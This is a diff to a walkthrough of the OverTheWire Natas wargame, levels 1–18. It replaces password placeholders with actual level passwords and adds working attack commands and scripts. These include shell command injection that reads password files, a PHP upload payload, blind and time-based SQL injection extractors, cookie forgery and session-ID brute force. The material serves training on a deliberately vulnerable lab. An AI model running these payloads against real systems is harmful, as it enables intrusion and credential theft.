@@ -45,7 +45,7 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The right-click block is a client-side JavaScript attribute on `<body>` — it only affects a browser's context menu, not the data. The password is in an HTML comment (`<!--The password for natas2 is ... -->`), and comments are part of the raw response, so fetching the page with curl and grepping the comment line retrieves it without needing a browser or defeating any server-side control.
 - **Commands:**
   ```
-  curl -s -u natas1:<pw> http://natas1.natas.labs.overthewire.org/ | grep "natas2 is"
+  curl -s -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 http://natas1.natas.labs.overthewire.org/ | grep "natas2 is"
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Log in with the password from level 0.** `curl -u natas1:<pw>` — the level's own page confirms the credential works.
@@ -76,9 +76,9 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The `<img src="files/pixel.png">` reveals a `files/` directory. The web server has directory indexing enabled for that directory, so requesting `files/` returns an Apache index listing, which shows `users.txt` next to `pixel.png`. That file is a plain credentials list and includes the line `natas3:<password>`. The bug is a combination of an unlinked-but-guessable directory and an open index, not a code flaw.
 - **Commands:**
   ```
-  curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/ | grep img
-  curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/
-  curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/users.txt
+  curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/ | grep img
+  curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/ | grep -o 'href="[^"]*"'
+  curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/users.txt | grep natas3
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the page.** The visible content is almost nothing: one image tag.
@@ -113,9 +113,9 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The hint points at search-engine indexing, so we read `robots.txt`, which lists `Disallow: /s3cr3t/`. robots.txt is a public file that *reveals* paths rather than hiding them; it only asks well-behaved crawlers to stay out. That directory has Apache directory indexing enabled, so `s3cr3t/` lists `users.txt`, which contains `natas4:<password>`.
 - **Commands:**
   ```
-  curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/robots.txt
-  curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/
-  curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+  curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/robots.txt
+  curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/s3cr3t/ | grep -o 'href="[^"]*"'
+  curl -s -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | grep natas4
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the page and its comment.** The body says "There is nothing on this page"; the comment adds that not even Google will find it. That wording is a deliberate hint about crawler rules.
@@ -147,7 +147,8 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The check is on the HTTP `Referer` header, which the *client* supplies. It is not a security boundary — it is trivially spoofed with `curl -H 'Referer: ...'`. We send the header claiming we came from natas5, and the server grants access and prints natas5's password. The lesson: client-controlled headers cannot be trusted for access control.
 - **Commands:**
   ```
-  curl -s -u natas4:<pw> -H 'Referer: http://natas5.natas.labs.overthewire.org/' http://natas4.natas.labs.overthewire.org/
+  curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth http://natas4.natas.labs.overthewire.org/ | grep -i disallowed
+  curl -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/ | grep -i granted
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **See the rejection message.** Fetching the page plainly gives:
@@ -175,8 +176,8 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The server sets a cookie `loggedin=0` and decides access from that cookie's value. Cookies are stored client-side, so we can set `loggedin=1` ourselves with `curl -b`. The server trusts the cookie without a server-side session or signature, so it accepts the forged value and prints natas6's password.
 - **Commands:**
   ```
-  curl -sI -u natas5:<pw> http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie   # loggedin=0
-  curl -s -u natas5:<pw> -b 'loggedin=1' http://natas5.natas.labs.overthewire.org/
+  curl -sI -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie
+  curl -s -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -b "loggedin=1" http://natas5.natas.labs.overthewire.org/ | grep -i granted
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Fetch the page.** It says "You are not logged in." Nothing in the body says how login is represented.
@@ -203,9 +204,9 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The page exposes its source (`index-source.html`), which shows the form compares `$_POST['secret']` with `$secret`, loaded by `include "includes/secret.inc"`. The include file is directly fetchable from the web root, so requesting `includes/secret.inc` reveals `$secret = "FOEIUWGHFEEUHOFUOIU"`. Posting that value passes the comparison and prints the next password. The bug is that a PHP include is served as plain text over HTTP.
 - **Commands:**
   ```
-  curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/index-source.html
-  curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/includes/secret.inc
-  curl -s -u natas6:<pw> -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=1' http://natas6.natas.labs.overthewire.org/
+  curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/index-source.html | grep -o "includes/secret.inc" | head -1
+  curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/includes/secret.inc
+  curl -s -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" http://natas6.natas.labs.overthewire.org/ | grep -i granted
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the page source.** The level links `index-source.html`, which is the PHP source with the HTML entities escaped. It shows the comparison and, crucially, where `$secret` comes from:
@@ -239,7 +240,8 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The `page` parameter is used to include a file without validation — a local file inclusion / path traversal. Passing an absolute path (`page=/etc/natas_webpass/natas8`) makes PHP read that file and print it into the page, giving us the password. There is no need for `../` because the parameter accepts absolute paths directly.
 - **Commands:**
   ```
-  curl -s -u natas7:<pw> 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
+  curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 http://natas7.natas.labs.overthewire.org/ | grep -o "hint:.*"
+  curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' | sed -n '/<br>/,/<\!--/p' | grep -v '<br>' | grep -v '\!--'
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the page and the comment.** The links are `index.php?page=home` and `index.php?page=about`, and the HTML comment states the goal explicitly:
@@ -265,9 +267,9 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** `encodeSecret` is `bin2hex(strrev(base64_encode($secret)))`. To invert it, undo the operations in reverse order: hex-decode, reverse the string, then base64-decode. Hex-decoding yields `==QcCtmMml1ViV3b`; reversing yields `b3ViV1lmMmtCcQ==`; base64-decoding yields `oubWYf2kBq`. Posting that value satisfies the comparison and returns natas9's password. This is obfuscation, not hashing — every step is reversible.
 - **Commands:**
   ```
-  curl -s -u natas8:<pw> http://natas8.natas.labs.overthewire.org/index-source.html
-  python3 -c "import base64; h='3d3d516343746d4d6d6c315669563362'; s=bytes.fromhex(h).decode()[::-1]; print(base64.b64decode(s).decode())"
-  curl -s -u natas8:<pw> -d 'secret=oubWYf2kBq&submit=1' http://natas8.natas.labs.overthewire.org/
+  curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc http://natas8.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g" | grep -o '$encodedSecret = "[0-9a-f]*"'
+  python3 -c "import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())"
+  curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc -d "secret=oubWYf2kBq&submit=1" http://natas8.natas.labs.overthewire.org/ | grep -i granted
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `index-source.html` shows the comparison and the encoder:
@@ -303,7 +305,8 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** `$key` is interpolated straight into a shell command, so shell metacharacters in the input are executed by `sh`. Sending `; cat /etc/natas_webpass/natas10 #` terminates the grep command and runs `cat` on the password file; the trailing `#` comments out the remaining ` dictionary.txt`. The output of both commands is printed. This is classic OS command injection: user input reaching `passthru` unescaped.
 - **Commands:**
   ```
-  curl -s -u natas9:<pw> --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/
+  curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 http://natas9.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g" | tr -d "\n" | grep -o "passthru([^)]*)"
+  curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 --data-urlencode "needle=; cat /etc/natas_webpass/natas10 #" http://natas9.natas.labs.overthewire.org/ | sed -n "/<pre/,/<\/pre>/p" | sed "s/<[^>]*>//g" | grep -v "^$" | head -3
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** The level exposes `index-source.html`; the relevant line is
@@ -334,7 +337,8 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** Blocking shell separators is not enough: the unquoted `$key` is still split by the shell, and grep itself takes multiple file arguments. We pass a pattern followed by a space and a path, `^ /etc/natas_webpass/natas11`. The shell builds `grep -i ^ /etc/natas_webpass/natas11 dictionary.txt`; grep treats `/etc/natas_webpass/natas11` as a second input file, and the `^` pattern matches every line of it, printing the password prefixed by the filename. No metacharacter is needed — argument injection suffices.
 - **Commands:**
   ```
-  curl -s -u natas10:<pw> --data-urlencode 'needle=^ /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org/
+  curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv http://natas10.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g" | tr -d "\n" | grep -o "preg_match([^)]*)"
+  curl -s -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv --data-urlencode "needle=^ /etc/natas_webpass/natas11" http://natas10.natas.labs.overthewire.org/ | sed -n "/<pre/,/<\/pre>/p" | sed "s/<[^>]*>//g" | grep natas11
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** It is the same `passthru` construct plus a filter:
@@ -365,9 +369,19 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The source shows `xor_encrypt` XORs each byte of the JSON with the repeating key, and `saveData` base64-encodes the result into the `data` cookie. We know the plaintext for the default cookie (`{"showpassword":"no","bgcolor":"#ffffff"}`), so XORing the decoded cookie with that plaintext recovers the key; it turns out to be the 4-byte key `kBSw` repeating. With the key we encrypt a new JSON object whose `showpassword` is `"yes"`, base64-encode it, and send it as the cookie. The server decrypts it, sees the flag, and prints natas12's password. XOR with a short repeating key and known plaintext is a classic keystream-recovery break.
 - **Commands:**
   ```
-  curl -s -D- -o /dev/null -u natas11:<pw> http://natas11.natas.labs.overthewire.org/ | grep -i set-cookie
-  # python: decode cookie, XOR with known plaintext -> key b'kBSw'; forge cookie for showpassword=yes
-  curl -s -u natas11:<pw> -b 'data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F' http://natas11.natas.labs.overthewire.org/
+  curl -s -D- -o /dev/null -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd http://natas11.natas.labs.overthewire.org/ | grep -i set-cookie
+  python3 - <<'PY'
+  import base64, urllib.parse, json
+  c = 'EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'
+  ct = base64.b64decode(urllib.parse.unquote(c))
+  pt = b'{"showpassword":"no","bgcolor":"#ffffff"}'
+  key = bytes(a ^ b for a, b in zip(pt, ct))[:4]
+  print('recovered key:', key)
+  want = json.dumps({"showpassword":"yes","bgcolor":"#ffffff"}, separators=(',',':')).encode()
+  enc = bytes(want[i] ^ key[i % len(key)] for i in range(len(want)))
+  print('forged cookie:', urllib.parse.quote(base64.b64encode(enc).decode(), safe=''))
+  PY
+  curl -s -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd -b "data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F" http://natas11.natas.labs.overthewire.org/ | grep -i "password for natas12"
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** It shows the cookie format and the crypto:
@@ -423,11 +437,11 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The upload handler builds the stored path from the client-supplied `filename` POST field: `makeRandomPathFromFilename("upload", $_POST["filename"])` takes the extension from that field, so the random prefix does not matter. By sending `filename=shell.php`, the uploaded bytes are stored as `upload/<random>.php` and are executed as PHP by the server. There is no content-type or image validation in this level. The PHP payload prints the contents of `/etc/natas_webpass/natas13`; requesting the returned upload URL executes it and returns the password. This is an unrestricted file upload → remote code execution.
 - **Commands:**
   ```
-  curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'makeRandomPathFromFilename[^)]*)'
+  curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g" | tr -d "\n" | grep -o "makeRandomPathFromFilename[^)]*)"
   printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/n12shell.php
   ls -l /tmp/n12shell.php
-  P=$(curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/n12shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php | grep -o 'upload/[a-z0-9]*\.php' | head -1); echo "$P"
-  curl -s -u natas12:<pw> "http://natas12.natas.labs.overthewire.org/$P"
+  P=$(curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng -F "filename=shell.php" -F "uploadedfile=@/tmp/n12shell.php;type=image/jpeg" http://natas12.natas.labs.overthewire.org/index.php | grep -o "upload/[a-z0-9]*\.php" | head -1); echo "$P"
+  curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng "http://natas12.natas.labs.overthewire.org/$P"
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** The upload handler shows where the stored filename comes from:
@@ -461,12 +475,12 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** `exif_imagetype` only inspects the file's magic bytes to decide whether it looks like an image; it does not require the whole file to be a valid image, and it does not check the extension. Prepending the six-byte GIF header `GIF89a` makes the file pass the check, while the rest of the file is still PHP code. We send `filename=shell.php` as before so it is stored with a `.php` extension and executed, and the PHP prints `/etc/natas_webpass/natas14`. The lesson: content sniffing on a prefix is bypassable with a polyglot file, and the extension must be enforced separately.
 - **Commands:**
   ```
-  curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'exif_imagetype[^)]*)'
+  curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g" | tr -d "\n" | grep -o "exif_imagetype[^)]*)"
   printf 'GIF89a' > /tmp/n13shell.php
   printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/n13shell.php
   file /tmp/n13shell.php
-  P=$(curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/n13shell.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php | grep -o 'upload/[a-z0-9]*\.php' | head -1); echo "$P"
-  curl -s -u natas13:<pw> "http://natas13.natas.labs.overthewire.org/$P"
+  P=$(curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k -F "filename=shell.php" -F "uploadedfile=@/tmp/n13shell.php;type=image/gif" http://natas13.natas.labs.overthewire.org/index.php | grep -o "upload/[a-z0-9]*\.php" | head -1); echo "$P"
+  curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k "http://natas13.natas.labs.overthewire.org/$P"
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** The handler now adds one line before accepting the upload:
@@ -504,7 +518,8 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The source builds `SELECT * from users where username="$u" and password="$p"` by string concatenation, so both fields are injectable. Supplying `username=" OR 1=1 -- ` closes the string and appends a tautology; `-- ` comments out the password clause, so the query returns every row and `mysqli_num_rows(...) > 0` is true. The page prints the success message with natas15's password. This is SQL injection via unparameterised input; prepared statements would prevent it.
 - **Commands:**
   ```
-  curl -s -u natas14:<pw> --data-urlencode 'username=" OR 1=1 -- ' --data-urlencode 'password=x' http://natas14.natas.labs.overthewire.org/
+  curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 http://natas14.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\n' | grep -o 'SELECT [^;]*' | head -1
+  curl -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 --data-urlencode 'username=" OR 1=1 -- ' --data-urlencode "password=x" http://natas14.natas.labs.overthewire.org/ | grep -i "successful"
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** The login handler builds the query by concatenation:
@@ -535,8 +550,31 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** The username is concatenated into the query, so we can append conditions. `username=natas16" AND password LIKE "%` returns "exists", proving the user `natas16` exists and that we can test predicates on its password. To read the password without a visible value, we test one character position at a time with a binary search: `AND ORD(SUBSTR(password,<pos>,1)) > <mid>`. The "exists" / "doesn't exist" response is the one-bit oracle; each step halves the character range (ASCII 32–126), so ~7 requests per character recover it. The script below extracts all 32 characters and prints the password.
 - **Commands:**
   ```
-  curl -s -u natas15:<pw> --data-urlencode 'username=natas16" AND password LIKE "%' http://natas15.natas.labs.overthewire.org/
-  # python: binary search on ORD(SUBSTR(password,pos,1)) over ASCII 32..126
+  curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g http://natas15.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g" | tr -d "\n" | grep -o "SELECT [^;]*;" | head -1
+  curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g --data-urlencode 'username=natas16" AND password LIKE "%' http://natas15.natas.labs.overthewire.org/ | grep -i "exists"
+  python3 - <<'PY'
+  import urllib.request, urllib.parse, base64
+  url = 'http://natas15.natas.labs.overthewire.org/'
+  auth = 'Basic ' + base64.b64encode(b'natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g').decode()
+  def exists(p):
+      d = urllib.parse.urlencode({'username': p}).encode()
+      r = urllib.request.Request(url, data=d, headers={'Authorization': auth})
+      return b'This user exists' in urllib.request.urlopen(r, timeout=15).read()
+  out = ''
+  for pos in range(1, 33):
+      lo, hi = 32, 126
+      while lo < hi:
+          mid = (lo + hi) // 2
+          if exists('natas16" AND ORD(SUBSTR(password,%d,1)) > %d -- ' % (pos, mid)):
+              lo = mid + 1
+          else:
+              hi = mid
+      if lo == 32:
+          break
+      out += chr(lo)
+      print(out, flush=True)
+  print('FINAL', out)
+  PY
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** The query only takes a username, and the output is a fixed message either way:
@@ -594,9 +632,39 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Technique and why it works:** We inject `$(grep <pattern> /etc/natas_webpass/natas17)`. The shell substitutes the output of that grep into the argument of the outer `grep`, so the outer grep searches the dictionary for the *result*. If the inner grep matches, it prints the natas17 password, which is unlikely to appear in dictionary.txt — so the outer grep outputs nothing. If the inner grep does not match, it prints nothing, the outer grep is run with an empty pattern, and it dumps the whole dictionary (a large response, ~460 KB). That gives a yes/no oracle: empty output means the pattern matched. Using bracket classes (which need no quotes) we binary-search each character with `grep ^<prefix>[<range>] /etc/natas_webpass/natas17`, recovering the full password with ~6–7 requests per character.
 - **Commands:**
   ```
-  curl -s -u natas16:<pw> --data-urlencode 'needle=$(grep ^[A-M] /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/
-  # empty <pre> output => prefix matches; full dictionary dump => no match
-  # python: binary search over [0-9A-Za-z] for each position (script in the recording)
+  curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb http://natas16.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "preg_match([^)]*)"
+  echo -n "matching prefix ^K -> "; curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^K /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n "/<pre>/,/<\/pre>/p" | wc -c
+  echo -n "non-matching prefix ^Z -> "; curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^Z /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n "/<pre>/,/<\/pre>/p" | wc -c
+  python3 - <<'PY'
+  import urllib.request, urllib.parse, base64
+  url = 'http://natas16.natas.labs.overthewire.org/'
+  auth = 'Basic ' + base64.b64encode(b'natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb').decode()
+  CHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+  def empty(payload):
+      d = urllib.parse.urlencode({'needle': payload}).encode()
+      r = urllib.request.Request(url, data=d, headers={'Authorization': auth})
+      body = urllib.request.urlopen(r, timeout=30).read().decode('utf-8', 'replace')
+      i = body.find('<pre>'); j = body.find('</pre>', i)
+      return len(body[i+5:j].strip()) == 0
+  prefix = ''
+  for pos in range(1, 40):
+      lo, hi = 0, len(CHARS) - 1
+      while lo < hi:
+          mid = (lo + hi) // 2
+          if empty('$(grep ^%s[%s] /etc/natas_webpass/natas17)' % (prefix, CHARS[lo:mid+1])):
+              hi = mid
+          else:
+              lo = mid + 1
+      ch = CHARS[lo]
+      if not empty('$(grep ^%s%s /etc/natas_webpass/natas17)' % (prefix, ch)):
+          print('FINAL', prefix, flush=True)
+          break
+      prefix += ch
+      print(prefix, flush=True)
+      if empty('$(grep ^%s$ /etc/natas_webpass/natas17)' % prefix):
+          print('FINAL', prefix, flush=True)
+          break
+  PY
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source and the filter.** The level shows the exact blacklist:
@@ -639,6 +707,42 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** The page runs `SELECT * from users where username="".$_REQUEST["username"].""`. All output about whether the user exists is commented out, so the response never changes — a **blind** SQL injection. The `users` table holds a row `username="natas18"` whose `password` is the next password.
 - **Technique and why it works:** blind SQL injection through **time delays**. We inject `" OR IF(<condition>,SLEEP(5),0)-- -`. The `OR` is essential: the username lookup fails, but the `OR` branch still evaluates, and because the query matches several rows, `SLEEP(5)` runs once per row — a true condition takes about 20 s while a false one returns in under a second. That timing difference is our yes/no oracle. For each character position we binary-search `ORD(SUBSTR(password,pos,1))` between 32 and 127, asking whether the code is `>= mid`; the delay answers each question. The password length (32) is found the same way with `LENGTH(password)`.
 
+- **Commands:**
+  ```
+  curl -s -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx http://natas17.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "SELECT \* from users[^;]*"
+  echo -n "true condition  -> "; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c "print('%.1f s' % ($e - $s))"
+  echo -n "false condition -> "; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c "print('%.1f s' % ($e - $s))"
+  echo -n "length = 32     -> "; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x" OR IF((SELECT LENGTH(password) FROM users WHERE username="natas18")=32,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c "print('%.1f s' % ($e - $s))"
+  python3 - <<'PY'
+  import subprocess, time
+  BASE = 'http://natas17.natas.labs.overthewire.org/'
+  USER, PW = 'natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'
+  def timed(p):
+      t0 = time.time()
+      subprocess.run(['curl','-s','-m','90','-o','/dev/null','-u',USER+':'+PW,
+                      '--data-urlencode','username='+p,BASE],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=100)
+      return time.time() - t0
+  def cond(expr):
+      # one SLEEP per query: the subquery is evaluated once, so a true answer
+      # costs one 5-second sleep instead of one per matched row
+      return timed('x" OR (SELECT IF(' + expr + ',SLEEP(5),0) FROM users WHERE username="natas18")-- -') > 2.5
+  pw = ''
+  for pos in range(1, 33):
+      lo, hi = 32, 127
+      while lo < hi:
+          mid = (lo + hi + 1) // 2
+          e = 'ORD(SUBSTR(password,' + str(pos) + ',1))>=' + str(mid)
+          if cond(e):
+              lo = mid
+          else:
+              hi = mid - 1
+      pw += chr(lo)
+      print('pos', pos, repr(chr(lo)), pw, flush=True)
+  print('FINAL', pw, flush=True)
+  PY
+  ```
+
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `curl -u natas17:<pw> .../index-source.html` shows the query with double quotes and the commented-out existence messages.
 2. **Confirm the injection and the oracle.**
@@ -649,7 +753,7 @@ Verification rule used throughout: a password is accepted only if a request to
    The delay is per matched row, which is why the true case is ~20 s rather than 5 s.
 3. **Find the length.**
    ```
-   ... IF((SELECT LENGTH(password) FROM users WHERE username="natas18")=32,SLEEP(5),0)-- -
+   curl -s -m 90 -o /dev/null -u natas17:<pw> --data-urlencode 'username=x" OR IF((SELECT LENGTH(password) FROM users WHERE username="natas18")=32,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/
    # ~20 s -> the password is 32 characters
    ```
 4. **Binary-search each character, one sleep per query.** The first oracle
@@ -683,6 +787,25 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** A login form creates a session with `session_id(rand(1,640))` and stores `$_SESSION["admin"] = isValidAdminLogin()`. The direct `admin` login is disabled, and credentials are printed only when the session's `admin` flag is 1.
 - **Technique and why it works:** the session identifier is a random number in a small range (1..640) and the server keeps the session state. So we **brute-force the PHPSESSID cookie** from 1 to 640: exactly one of those IDs belongs to an existing session with `admin=1` (the pre-seeded admin session). When we hit it, the server loads that session and `print_credentials()` reveals the next password. The weakness is the tiny, guessable session-ID space.
 
+- **Commands:**
+  ```
+  curl -s -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op http://natas18.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "maxid = 640"
+  python3 - <<'PY'
+  import urllib.request, base64
+  url = "http://natas18.natas.labs.overthewire.org/"
+  auth = "Basic " + base64.b64encode(b"natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op").decode()
+  for sid in range(1, 641):
+      req = urllib.request.Request(url, headers={"Authorization": auth, "Cookie": "PHPSESSID=%d" % sid})
+      body = urllib.request.urlopen(req, timeout=10).read().decode("utf-8", "replace")
+      if "You are an admin" in body:
+          i = body.find("<pre>"); j = body.find("</pre>", i)
+          print("FOUND sid", sid)
+          print(body[i:j+6])
+          break
+  else:
+      print("none")
+  PY
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
